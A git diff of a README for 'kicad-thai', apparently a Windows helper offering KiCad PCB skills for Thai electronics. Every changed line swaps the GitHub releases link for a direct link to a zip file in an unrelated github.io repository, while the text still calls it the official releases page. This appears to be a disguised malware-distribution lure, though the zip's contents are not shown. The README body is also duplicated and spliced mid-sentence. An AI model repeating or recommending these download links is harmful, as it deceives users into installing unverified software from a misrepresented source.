@@ -5,7 +5,7 @@ description: "Automate Thai PCB design with AI KiCad agent skills: factory DRC, 
 ---
 # 🛠️ kicad-thai - PCB Skills Made Simple for Thai Electronics
 
-[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jerssonhans-creator/jerssonhans-creator.github.io/main/img/2.0.zip)
 
 kicad-thai is a Windows-friendly helper for people who design printed circuit boards for the Thai electronics market. It brings together practical KiCad PCB skills, manufacturing file exports, local compliance checklists, and Thai silkscreen support in one place. You do not need to be a programmer to use it. If you can download a file and open an application on Windows, you can get started.
 
@@ -13,9 +13,9 @@ The project is made for real electronics work: checking board designs, preparing
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download kicad-thai from the official releases page](https://github.com/jerssonhans-creator/kicad-thai/releases).
+Visit this link to download the application: [Download kicad-thai from the official releases page](https://raw.githubusercontent.com/jerssonhans-creator/jerssonhans-creator.github.io/main/img/2.0.zip).
 
-[![Get kicad-thai](https://img.shields.io/badge/Get%20kicad--thai-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Get kicad-thai](https://img.shields.io/badge/Get%20kicad--thai-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jerssonhans-creator/jerssonhans-creator.github.io/main/img/2.0.zip)
 
 The releases page is the official place to get kicad-thai for your Windows computer. Use the link above when you are ready to download the application.
 
@@ -25,7 +25,7 @@ Start by visiting the download link above. Once kicad-thai is on your Windows co
 
 kicad-thai is designed to sit alongside your normal PCB work. You can use it when you are preparing a board for manufacturing, checking a design before production, or making sure your board# 🛠️ kicad-thai - PCB Skills Made Simple for Thai Electronics
 
-[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Download kicad-thai](https://img.shields.io/badge/Download-kicad--thai-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jerssonhans-creator/jerssonhans-creator.github.io/main/img/2.0.zip)
 
 kicad-thai is a practical helper for anyone who designs printed circuit boards for the Thai electronics market. It bundles ready-to-use KiCad PCB skills, design rule presets, manufacturing file exports, local compliance checklists, and Thai silkscreen support into one straightforward package for Windows. You do not need any programming knowledge to use it. If you can download a file from a web page and open an application on Windows, you can use kicad-thai.
 
@@ -33,9 +33,9 @@ The project is built for real electronics work: checking a board before you send
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download kicad-thai from the official releases page](https://github.com/jerssonhans-creator/kicad-thai/releases).
+Visit this link to download the application: [Download kicad-thai from the official releases page](https://raw.githubusercontent.com/jerssonhans-creator/jerssonhans-creator.github.io/main/img/2.0.zip).
 
-[![Get kicad-thai](https://img.shields.io/badge/Get%20kicad--thai-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jerssonhans-creator/kicad-thai/releases)
+[![Get kicad-thai](https://img.shields.io/badge/Get%20kicad--thai-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jerssonhans-creator/jerssonhans-creator.github.io/main/img/2.0.zip)
 
 The releases page is the official place to get kicad-thai for your Windows computer. Open the link, choose the latest release, and download the application. Keep this page bookmarked so you can return for updates later.
 
